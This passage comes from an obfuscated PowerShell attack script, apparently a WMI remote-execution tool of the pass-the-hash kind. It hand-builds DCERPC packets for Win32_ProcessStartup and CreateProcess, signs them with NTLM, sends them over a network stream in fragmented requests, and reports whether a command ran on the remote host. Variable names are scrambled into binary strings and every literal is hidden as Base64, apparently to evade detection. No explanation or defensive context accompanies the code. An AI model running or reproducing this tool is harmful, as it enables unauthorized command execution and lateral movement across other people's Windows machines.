                                                0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,0x00,0x00,0x00,0x49,0x6e,
                                                0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,
                                                0x00,0x00,0x85,0x01,0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,
                                                0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0xe2,0x01,0x00,0x00,0x00,
                                                0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,0x50,0x72,0x6f,0x63,
                                                0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,0x68,0x72,0x65,0x61,
                                                0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x73,0x7c,0x43,
                                                0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x7c,
                                                0x6c,0x70,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x44,0x69,0x72,0x65,
                                                0x63,0x74,0x6f,0x72,0x79,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,
                                                0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,
                                                0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,
                                                0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,
                                                0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,
                                                0x2b,0x02,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0xda,0x01,0x00,0x00,
                                                0x00,0x49,0x44,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,
                                                0x03,0x08,0x00,0x00,0x00,0xba,0x02,0x00,0x00,0xac,0x01,0x00,0x00,
                                                0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x2b,0x02,0x00,0x00,0x02,0x08,
                                                0x20,0x00,0x00,0xda,0x01,0x00,0x00,0x72,0x02,0x00,0x00,0x11,0x03,
                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,
                                                0x67,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x49,0x6e,0x66,0x6f,
                                                0x72,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x00,0x00,0x6f,0x62,0x6a,0x65,
                                                0x63,0x74,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,
                                                0x08,0x00,0x00,0x00,0xef,0x02,0x00,0x00,0x00,0x49,0x6e,0x00,0x0d,
                                                0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,
                                                0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,
                                                0xff,0xff,0x01,0x00,0x00,0x00,0x4c,0x03,0x00,0x00,0x00,0x57,0x4d,
                                                0x49,0x7c,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x00,0x00,0x4d,0x61,
                                                0x70,0x70,0x69,0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,
                                                0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x29,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,
                                                0x00,0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,
                                                0x00,0xff,0xff,0x66,0x03,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x44,
                                                0x03,0x00,0x00,0x00,0x49,0x44,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,
                                                0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,
                                                0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0xf5,0x03,0x00,0x00,0x16,
                                                0x03,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x66,0x03,0x00,
                                                0x00,0x02,0x08,0x20,0x00,0x00,0x44,0x03,0x00,0x00,0xad,0x03,0x00,
                                                0x00,0x11,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x6f,0x62,
                                                0x6a,0x65,0x63,0x74,0x3a,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,
                                                0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70 +
                                                (,0x00 * 501) +
                                                ${01001001010111010} +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x0e,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01 +
                                                ${10011010101010011} +
                                                0x00,0x80,0x00,0x5f,0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,
                                                0x52,0x53,0x00,0x00 +
                                                ${01001101101010111} +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00
                                if(${00000111101111001}.Length -lt ${10110100110101000})
                                {
                                    ${10111001100010100} = 0x83
                                    ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQA')))
                                }
                                else
                                {
                                    ${11000010011101000} = $true
                                    ${00110001111101010} = [Math]::Ceiling(${00000111101111001}.Length / ${10110100110101000})
                                    if(${10001100000101111} -lt 2)
                                    {
                                        ${11000000101010110} = ${00000111101111001}.Length
                                        ${00000111101111001} = ${00000111101111001}[0..(${10110100110101000} - 1)]
                                        ${10001100000101111} = 2
                                        ${10001011110100001} = 10
                                        ${10111001100010100} = 0x81
                                        ${10111001100000001} = ${10110100110101000}
                                        ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                    }
                                    elseif(${10001100000101111} -eq ${00110001111101010})
                                    {
                                        ${11000010011101000} = $false
                                        ${00110110010011000} = [System.BitConverter]::GetBytes(${10001011110100001})
                                        ${10001100000101111} = 0
                                        ${00000111101111001} = ${00000111101111001}[${10111001100000001}..${00000111101111001}.Length]
                                        ${10111001100010100} = 0x82
                                        ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQA')))
                                    }
                                    else
                                    {
                                        ${11000000101010110} = ${00000111101111001}.Length - ${10111001100000001}
                                        ${00000111101111001} = ${00000111101111001}[${10111001100000001}..(${10111001100000001} + ${10110100110101000} - 1)]
                                        ${10111001100000001} += ${10110100110101000}
                                        ${10001100000101111}++
                                        ${00110110010011000} = [System.BitConverter]::GetBytes(${10001011110100001})
                                        ${10001011110100001}++
                                        ${10111001100010100} = 0x80
                                        ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                    }
                                }
                            }
                        }
                        ${01110101000111010} = _00001110101011110 ${10111001100010100} ${00000111101111001}.Length 16 ${00100011010010100} ${01001010010100011} ${01000110111100000} ${10101001001100000} ${10101000111010010}
                        if(${11000010011101000})
                        {
                            ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA')))] = [System.BitConverter]::GetBytes(${11000000101010110})
                        }
                        ${10101010001110010} = _01000011010001100 ${00100011010010100} 0x04 ${00110110010011000}
                        ${01010000110101010} = _00011111101010011 ${01110101000111010}
                        ${01110010001101010} = _00011111101010011 ${10101010001110010} 
                        ${10001010001001010} = ${01011100110010101}.ComputeHash(${00110110010011000} + ${01010000110101010} + ${00000111101111001} + ${01110010001101010}[0..(${00100011010010100} + 7)])
                        ${10001010001001010} = ${10001010001001010}[0..7]
                        ${10101010001110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABWAGUAcgBpAGYAaQBlAHIAQwBoAGUAYwBrAHMAdQBtAA==')))] = ${10001010001001010}
                        ${01110010001101010} = _00011111101010011 ${10101010001110010}
                        ${10001000010101111} = ${01010000110101010} + ${00000111101111001} + ${01110010001101010}
                        ${01010111111011001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
                        ${01010111111011001}.Flush()
                        if(!${11000010011101000})
                        {
                            ${01010111111011001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
                        }
                        while(${01010111111011001}.DataAvailable)
                        {
                            ${01010111111011001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
                            sleep -m $Sleep
                        }
                        ${10001010110110111} = ${01110101011101101}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQA')))
                    {
                        while(${01010111111011001}.DataAvailable)
                        {
                            ${01010111111011001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
                            sleep -m $Sleep
                        }
                        if(${00001011000101101}[1145] -ne 9)
                        { 
                            ${00011001111101111} = _01010101100011101 1141 ${00001011000101101}
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbQBtAGEAbgBkACAAZQB4AGUAYwB1AHQAZQBkACAAdwBpAHQAaAAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAAkAHsAMAAwADAAMQAxADAAMAAxADEAMQAxADEAMAAxADEAMQAxAH0AIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMAAxADAAMQAwADEAMQAxAH0A')))
                        }
                        else
                        {
                            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABQAHIAbwBjAGUAcwBzACAAZABpAGQAIABuAG8AdAAgAHMAdABhAHIAdAAsACAAYwBoAGUAYwBrACAAeQBvAHUAcgAgAGMAbwBtAG0AYQBuAGQA')))
                        }
                        ${10001010110110111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                    }
                }
                sleep -m $Sleep
            }
            ${01101110100100101}.Close()
            ${01010111111011001}.Close()
        }
        ${01000011001101101}.Close()
        ${00111101001000001}.Close()
    }
}
}
